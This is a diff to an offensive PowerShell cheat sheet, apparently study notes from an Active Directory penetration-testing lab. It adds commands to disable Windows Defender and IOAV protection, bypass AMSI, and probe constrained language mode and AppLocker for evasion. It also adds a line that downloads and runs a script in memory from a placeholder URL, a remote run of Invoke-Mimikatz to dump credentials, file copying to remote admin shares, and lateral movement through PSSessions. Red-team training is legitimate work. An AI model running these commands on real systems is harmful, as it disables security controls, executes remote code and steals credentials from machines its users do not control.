@@ -7,11 +7,26 @@ Set-MpPreference -DisableIOAVProtection $true
 ##### AMSI Bypass remotely
 Invoke-command - ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session <session>
 
+##### Check for Contrained Language Mode
+$ExecutionContext.SessionState.LanguageMode
+ - (FullLanguage == Free as a bird; ConstrainedLanguage == Locked up)
+
+##### Enumerate AppLocker (If Applocker is configured in "Allow mode" for scripts, PowerShell 5 automatically uses the Constrained Language Mode.)
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+ - (Looking for "Allows members of the Everyone group"  - Indicates that that folder can run scripts if you have control of a user in the Everyone group)
+
+##### Disable WinDefender
+Set-MpPreference -DisableRealtimeMonitoring $true -Verbose 
+
 ##### PS Download into memory 
 iex (iwr http://<url>/<file>.ps1 -UseBasicParsing)
 
+##### Copy file from local machine to remote machine
+Copy-Item .\<file> \\<fdqn of remote>\c$\'Program Files'
+
 ##### Quickly confirm you have remote access to a machine:
 Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName <Computer Name>
+Invoke-Command -Filepath .\Invoke-Mimikatz.ps1 -Session $sesh
 
 ##### Create new PSSession to Computername
 $sesh = New-PSSession -ComputerName <ComputerName>
@@ -20,5 +35,8 @@ $sesh = New-PSSession -ComputerName <ComputerName>
 Enter-PSSession -session <session name ie $sesh>
 
 ##### Connect to Session by ComputerName
-Enter-PSSession -ComputerName <computer>
+Enter-PSSession -ComputerName <computer> 
+
+#### WMI shorthand
+gwmi -Class win32_computersystem -ComputerName dcorp- dc.dollarcorp.moneycorp.local
 
